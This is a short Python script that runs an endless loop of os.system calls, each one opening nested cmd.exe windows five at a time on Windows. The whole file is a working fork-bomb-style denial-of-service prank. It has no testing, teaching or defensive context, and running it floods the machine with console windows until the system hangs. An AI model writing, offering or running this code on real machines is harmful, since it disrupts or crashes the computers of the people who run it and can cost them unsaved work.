import os

def open_windows(how_many_windows):
    for i in range(how_many_windows):
        os.system('start cmd.exe /k "start cmd.exe /k "start cmd.exe /k "start cmd.exe"')

while True:
    open_windows(5)
